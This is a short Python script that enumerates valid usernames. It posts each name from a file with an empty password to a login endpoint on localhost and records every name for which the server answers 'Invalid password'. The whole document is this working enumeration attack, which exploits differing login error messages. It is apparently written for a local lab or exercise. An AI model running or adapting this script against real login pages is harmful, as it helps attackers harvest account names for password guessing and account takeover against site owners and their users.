import requests

lines = [line.rstrip('\n') for line in open('usernames-file')]
myfile = open('active-user.txt','w')

'''iterating through the file and find active users which 
would be stored in the file "active-users.txt"'''
for user in lines:
	r = requests.post('http://localhost:5000/login', data={'username': user, 'password': ""})
	resp = r.text
	if 'Invalid password' in resp:
		myfile.write(user+"\n")


myfile.close()

 
